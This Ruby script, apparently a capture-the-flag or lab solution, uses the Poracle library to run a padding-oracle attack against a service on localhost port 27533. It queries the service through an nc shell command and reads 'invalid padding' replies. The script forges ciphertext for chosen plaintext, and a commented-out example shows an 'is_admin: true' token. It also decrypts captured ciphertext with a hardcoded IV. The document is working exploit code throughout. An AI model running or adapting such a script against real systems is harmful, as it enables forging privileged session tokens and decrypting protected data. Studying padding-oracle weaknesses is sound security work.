require './Poracle'

BLOCKSIZE = 16

poracle = Poracle.new(BLOCKSIZE, verbose = true) do |data|
  shell_st = "echo 5468697320697320616e204956343536" + data.unpack("H*").pop + " | nc localhost 27533"

  result = `#{shell_st}`


#puts("HELLO")
#  puts(data.unpack("H*").pop + " gave " + ((result !~ /invalid padding/) ? "true" : "false"))


  while(result.length < 5)
    puts("Result is only " + result.length.to_s + " long!")
    puts("(" + result + ")")
    sleep(1)
    puts("Slept for 1, trying again")

    result = `#{shell_st}`
  end
  #if(result !~ /invalid padding/)
  #  puts('Sucess! Data: ' + data.unpack("H*").pop)
  #  puts('Output: ' + result)
  #  sleep(1)
  #  puts("continuing...")
  #end


  # Return
  result !~ /invalid padding/
end

data = ARGV[0] # '{"a":"b"}       '  #'{"username": "admin", "expires": "2020-01-07", "is_admin": "true"}'
print "Trying to encrypt: %s" % data
result = poracle.encrypt(data)

puts("-----------------------------")
puts("Encrypted string")
puts("-----------------------------")
puts result.unpack('H*')
puts("-----------------------------")
puts()

data = result.unpack('H*')  # = "7bb373a480bd0bb262d6d79fadf25696aaa48ed64111a6aabf4dbbbed68f5da041414141414141414141414141414141" # 'c196ffe46b23d4
#98d25aaca9c1984ab741414141414141414141414141414141'  #"5468697320697320616e2049563435360db5d4edcf799c3a6cfc502b10ab1242c1c2
#808d4b71e31a9ba6fb770194254f1a6579f76b6bb0aa3206023e22f4f8b8ddd7ecf14579dbbfac853ebcc7bf8d11fd8703dce82b480d21dfb56717e3a1e
#c"  # HTTParty.get("http://localhost:20222/encrypt").parsed_response
#data = data[32..-1]
print "Trying to decrypt: %s" % data

result = poracle.decrypt([data].pack('H*'), iv = "This is an IV456")
puts("-----------------------------")
puts("Decryption result")
puts("-----------------------------")
puts result
puts("-----------------------------")
puts()
